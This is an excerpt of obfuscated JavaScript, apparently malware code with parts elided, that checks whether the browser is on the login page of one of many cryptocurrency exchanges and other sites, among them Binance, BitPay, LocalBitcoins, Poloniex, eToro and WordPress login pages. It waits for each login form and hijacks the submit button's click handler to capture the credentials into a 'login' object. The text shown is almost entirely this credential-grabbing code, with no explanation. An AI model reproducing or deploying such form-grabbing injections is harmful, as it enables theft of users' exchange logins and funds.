...
if (window['location']['href']['indexOf']('binance.com/login.html') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('main')[0]) {
            clearInterval(interval);
            document['getElementById']('login-btn').onclick = function (_0x441cx2) {
             var login = {};
...
if (window['location']['href']['indexOf']('spectrocoin.com/en/login.html') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('login-form')[0]) {
            clearInterval(interval);
            document['getElementsByClassName']('btn yellow-btn')[0].onclick = function (_0x441cx2) {
             var login = {};
...
var login_form = document.getElementsByClassName("container-signin");
  ...
  if (window['location']['href']['indexOf']('bitpay.com/dashboard/login') > -1) {
      var interval = setInterval(function () {
  ...
  if (window['location']['href'] === 'auth.bitbay.net/login') {
      var interval = setInterval(function () {
  ...
  if (window['location']['href'] === 'auth.bitbay.net/login-password') {
      var interval = setInterval(function () {
          if (document['getElementsByClassName']('main-content-container')[0]) {
              clearInterval(interval);
              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
...
if (window['location']['href']['indexOf']('wp-login.php') > -1) {
  ...
  if (window['location']['href']['indexOf']('ltcbackoffice.org') > -1) {
        var interval = setInterval(function () {
    ...
    if (window['location']['href']['indexOf']('localbitcoins.com/accounts/login/') > -1) {
          var interval = setInterval(function () {
    ...
    if (window['location']['href']['indexOf']('sys.chip-coin.net:1006/sys/iCommerce/modules/mod_chipcoin/login.jsp') > -1) {
            var interval = setInterval(function () {
      ...
      if (window['location']['href']['indexOf']('onixcoin.com/inicio-sesion/') > -1) {
              var interval = setInterval(function () {
      ...
      if (window['location']['href']['indexOf']('coinpayments.net/login') > -1) {
                var interval = setInterval(function () {
          ...
          if (window['location']['href']['indexOf']('bancacumana.tk/') > -1) {
                  var interval = setInterval(function () {
          ...
          if (window['location']['href']['indexOf']('etoro.com/login') > -1) {
                    var interval = setInterval(function () {
    ...
    if (window['location']['href']['indexOf']('bitbackoffice.com') > -1) {
          var interval = setInterval(function () {
    ...
    if (window['location']['href']['indexOf']('btcstorm.cloud/login') > -1) {
            var interval = setInterval(function () {
        ...
        if (window['location']['href']['indexOf']('poloniex.com/login') > -1) {
              var interval = setInterval(function () {
        ...
        if (window['location']['href']['indexOf']('usitech-int.com/login') > -1) {
                var interval = setInterval(function () {
